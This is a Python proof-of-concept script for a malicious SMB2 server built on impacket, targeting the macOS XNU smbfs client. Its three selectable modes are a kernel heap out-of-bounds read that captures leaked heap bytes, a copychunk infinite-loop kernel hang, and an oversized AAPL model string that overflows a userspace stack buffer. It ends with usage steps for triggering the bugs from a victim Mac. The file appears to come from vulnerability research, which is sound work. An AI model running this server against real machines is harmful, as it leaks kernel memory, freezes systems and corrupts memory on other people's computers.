#!/usr/bin/env python3
"""
Malicious SMB2 server for XNU smbfs client findings.

Attack modes (mutually selectable via flags):

1. (default) Resume-key heap OOB read
   FSCTL_SRV_REQUEST_RESUME_KEY (0x00140078) is answered with OutputCount < 24.
   The XNU client allocates an OutputCount-byte buffer then does
   memcpy(key[24], buf, 24) -> heap OOB read; the 24 bytes go into the
   follow-up FSCTL_SRV_COPYCHUNK SourceKey (smbfs_smb_2.c:6777, :4400).

2. --dos-copychunk   (Finding 3: kernel hang / DoS)
   FSCTL_SRV_COPYCHUNK first reply is STATUS_INVALID_PARAMETER with
   ChunkBytesWritten=0, forcing the client to retry with max_chunk_len=0
   (smbfs_smb_2.c:4497). fillchunk_arr then emits 16 zero-length chunks so
   remaining_len never decreases and the copyfile thread loops forever while
   holding vnode locks.

3. --aapl-model     (Finding 2: wire-controlled userspace stack overflow)
   Every SMB2 CREATE response carries an AAPL create context
   (kAAPL_SERVER_QUERY, ReplyBitmap=kAAPL_SERVER_CAPS|kAAPL_MODEL_INFO) whose
   ModelString is 254 Hangul syllables (508 UTF-16 bytes, expanding to up to
   ~2.2KB UTF-8 after NFD). The client stores it as vcp->vc_model_info and
   smb_dev.c:492 then memcpy()s strlen() bytes into the 510-byte model_info
   field of the ioctl caller's stack struct (lib/smb/ctx.c smb_get_vc_properties).

Base: impacket SimpleSMBServer (SMB2/3), hooked via a custom SMBSERVER class.
"""
import argparse
import logging
import os
import struct
import sys

from impacket import smb3structs as smb2  # aliased 'smb2' inside impacket.smbserver
from impacket import smbserver
from impacket.nt_errors import STATUS_SUCCESS, STATUS_INVALID_DEVICE_REQUEST, STATUS_INVALID_PARAMETER

FSCTL_SRV_REQUEST_RESUME_KEY = 0x00140078
FSCTL_SRV_COPYCHUNK          = 0x001440F2
SMB2_RESUME_KEY_LEN          = 24
SMB2_COPYCHUNK_MAX_CHUNK_LEN = 1048576   # 1 MB (smb_rq_2.h:150)
STRUCT_SIZE_IOCTL_RSP        = 49
IOCTL_OUTPUT_OFFSET          = 0x70      # 64 (hdr) + 48 (struct)

# AAPL create-context constants (smb_2.h / smbfs client)
kAAPL_SERVER_QUERY = 1
kAAPL_SERVER_CAPS  = 0x01
kAAPL_VOLUME_CAPS  = 0x02
kAAPL_MODEL_INFO   = 0x04
SMB2_CREATE_AAPL   = 0x4141504c          # 'AAPL' as big-endian uint32 (smb_2.h:484)

OUTPUT_COUNT = 16
DOS_COPYCHUNK = False
AAPL_MODEL = False
DOS_STATE = {}   # connId -> copychunk call counter


def build_aapl_model_context():
    """AAPL create-context (kAAPL_SERVER_QUERY) carrying a long ModelString.

    Wire layout consumed by smb2_smb_parse_create_contexts():
      Next(4) NameOffset(2) NameLength(2)=4 Reserved(2) DataOffset(2)
      DataLength(4) 'AAPL'(4) pad(4)
      then data: SubCommand(4)=1 Reserved(4) ReplyBitmap(8)
                 ServerCaps(8) Pad(4) ModelStrLen(4) ModelStr(utf-16le)
    """
    # 254 Hangul syllables: 508 bytes of UTF-16 (str_len < 510 passes the
    # client check), expanding to ~762B UTF-8 1:1 and up to ~2.2KB after NFD.
    model_utf16 = ("\uAC01" * 254).encode('utf-16le')
    model_str_len = len(model_utf16)          # 508

    reply_bitmap = kAAPL_SERVER_CAPS | kAAPL_MODEL_INFO   # 0x05
    server_caps = 0x00                        # keep server on the non-mac copy path
    data = struct.pack('<IIQQ', kAAPL_SERVER_QUERY, 0, reply_bitmap, server_caps)
    data += struct.pack('<II', 0, model_str_len)   # Pad2 + ModelStrLen
    data += model_utf16
    data_len = len(data)

    header = struct.pack('<IHHHHI', 0, 16, 4, 0, 24, data_len)
    header += b'AAPL' + b'\x00' * 4
    return header + data


class EvilIoctls(smbserver.Ioctls):
    @staticmethod
    def fsctlSrvRequestResumeKey(connId, smbServer, ioctlRequest):
        smbServer.log(
            "[EVIL] RESUME_KEY: OutputCount=%d FileID=%s InputCount=%d "
            "MaxOutResp=%d" % (OUTPUT_COUNT,
                               ioctlRequest['FileID'].getData().hex(),
                               ioctlRequest['InputCount'],
                               ioctlRequest['MaxOutputResponse']),
            logging.WARNING,
        )
        smbServer.log(
            "[EVIL] FSCTL_SRV_REQUEST_RESUME_KEY -> returning OutputCount=%d "
            "(client will memcpy 24 bytes from a %d-byte heap buffer)"
            % (OUTPUT_COUNT, OUTPUT_COUNT),
            logging.WARNING,
        )
        return b"\x41" * OUTPUT_COUNT, STATUS_SUCCESS

    @staticmethod
    def fsctlSrvCopyChunk(connId, smbServer, ioctlRequest):
        buf = ioctlRequest['Buffer']
        source_key = buf[:SMB2_RESUME_KEY_LEN]

        if DOS_COPYCHUNK:
            n = DOS_STATE.get(connId, 0)
            DOS_STATE[connId] = n + 1
            chunk_count = 1
            if len(buf) >= 28:
                chunk_count = struct.unpack('<I', buf[24:28])[0]
            if n == 0:
                # First copychunk: tell the client to retry with a 0-byte
                # max chunk -> fillchunk_arr emits zero-length chunks.
                smbServer.log(
                    "[EVIL] COPYCHUNK #0 -> STATUS_INVALID_PARAMETER, "
                    "ChunkBytesWritten=0 (forcing max_chunk_len=0 retry)",
                    logging.WARNING,
                )
                r = smb2.SMB2Ioctl_Response()
                r['CtlCode'] = ioctlRequest['CtlCode']
                r['FileID'] = ioctlRequest['FileID']
                r['OutputOffset'] = IOCTL_OUTPUT_OFFSET
                r['OutputCount'] = 12
                r['Buffer'] = struct.pack('<III', 0, 0, 0)
                return r, STATUS_INVALID_PARAMETER
            else:
                # Subsequent copychunks: report a "successful" 0-byte copy so
                # remaining_len never advances -> the client loops forever.
                smbServer.log(
                    "[EVIL] COPYCHUNK #%d -> SUCCESS chunks=%d total=0 "
                    "(client is looping: zero-length chunk)" % (n, chunk_count),
                    logging.WARNING,
                )
                return struct.pack('<III', chunk_count, 0, 0), STATUS_SUCCESS

        # Normal mode: capture the (possibly leaked) SourceKey, echo success.
        smbServer.log(
            "[EVIL] FSCTL_SRV_COPYCHUNK SourceKey = %s (len %d) "
            "-> first %d bytes are our 'A' padding, the rest is kernel heap"
            % (source_key.hex(), len(source_key), OUTPUT_COUNT),
            logging.WARNING,
        )
        try:
            chunk_count = struct.unpack('<I', buf[24:28])[0]
            total_len = 0
            for i in range(chunk_count):
                off = 32 + i * 24
                (s_off, t_off, length, _res) = struct.unpack(
                    '<QQII', buf[off:off + 24])
                total_len += length
        except Exception:
            chunk_count = 1
            total_len = 0
        resp = struct.pack('<III', chunk_count,
                           SMB2_COPYCHUNK_MAX_CHUNK_LEN, total_len)
        return resp, STATUS_SUCCESS


class EvilServer(smbserver.SMBSERVER):
    def getIoctls(self):
        ioctls = dict(super().getIoctls())
        ioctls[FSCTL_SRV_REQUEST_RESUME_KEY] = EvilIoctls.fsctlSrvRequestResumeKey
        ioctls[FSCTL_SRV_COPYCHUNK] = EvilIoctls.fsctlSrvCopyChunk
        return ioctls


def patch_create_for_aapl():
    """Inject the AAPL model-info create context into every CREATE reply."""
    if not AAPL_MODEL:
        return
    aapl_ctx = build_aapl_model_context()
    orig = smbserver.SMB2Commands.smb2Create

    def patched(connId, smbServer, recvPacket):
        result = orig(connId, smbServer, recvPacket)
        respCommands, respPacket, errorCode = result
        if errorCode == STATUS_SUCCESS and respCommands:
            c = respCommands[0]
            if isinstance(c, smb2.SMB2Create_Response):
                c['CreateContextsOffset'] = 64 + 88   # 152: right after the struct
                c['CreateContextsLength'] = len(aapl_ctx)
                c['Buffer'] = aapl_ctx
        return result

    smbserver.SMB2Commands.smb2Create = patched
    logging.warning("[EVIL] AAPL model-info create-context injection ENABLED "
                    "(%d-byte Hangul model string)" % len(aapl_ctx))


def main():
    global OUTPUT_COUNT, DOS_COPYCHUNK, AAPL_MODEL

    ap = argparse.ArgumentParser()
    ap.add_argument('--listen', default='0.0.0.0')
    ap.add_argument('--port', type=int, default=445)
    ap.add_argument('--share-dir', default=None,
                    help='directory to share (created if missing)')
    ap.add_argument('--output-count', type=int, default=OUTPUT_COUNT,
                    help='resume-key OutputCount: <24 triggers OOB read '
                         '(use 32 as the patched-client baseline)')
    ap.add_argument('--dos-copychunk', action='store_true',
                    help='Finding 3: infinite copychunk loop (kernel hang)')
    ap.add_argument('--aapl-model', action='store_true',
                    help='Finding 2: inject AAPL model-info create context')
    args = ap.parse_args()

    if args.dos_copychunk and args.aapl_model:
        print("[!] pick one attack mode at a time")
        sys.exit(1)

    if args.output_count < SMB2_RESUME_KEY_LEN and args.output_count != 0x20:
        print("[!] output-count < 24 needs an UNPATCHED client; current macOS "
              "rejects it (use 32).")
        sys.exit(1)
    OUTPUT_COUNT = args.output_count
    DOS_COPYCHUNK = args.dos_copychunk
    AAPL_MODEL = args.aapl_model

    logging.basicConfig(level=logging.WARNING)
    smbserver.SimpleSMBServer.log_level = logging.INFO

    server = smbserver.SimpleSMBServer(listenAddress=args.listen,
                                       listenPort=args.port,
                                       smbserverclass=EvilServer)
    server.setSMB2Support(True)
    server.setNTLMSupport(True)

    share_name = 'share'
    if args.share_dir is None:
        args.share_dir = os.path.join(os.getcwd(), 'share_root')
    os.makedirs(args.share_dir, exist_ok=True)
    victim_file = os.path.join(args.share_dir, 'hello.txt')
    with open(victim_file, 'w') as f:
        f.write('victim file for copyfile trigger\n')

    server.addShare(share_name, args.share_dir)

    print("[*] Evil SMB2 server on %s:%d  share='%s'  OutputCount=%d"
          % (args.listen, args.port, share_name, OUTPUT_COUNT))
    if args.dos_copychunk:
        print("[*] MODE: copychunk infinite-loop DoS (Finding 3)")
    if args.aapl_model:
        print("[*] MODE: AAPL model-info create context (Finding 2)")
    print("[*] On macOS: mount smb://<host>/share and DUPLICATE hello.txt")
    print("[*] Watch this console.")
    patch_create_for_aapl()
    server.start()


if __name__ == '__main__':
    main()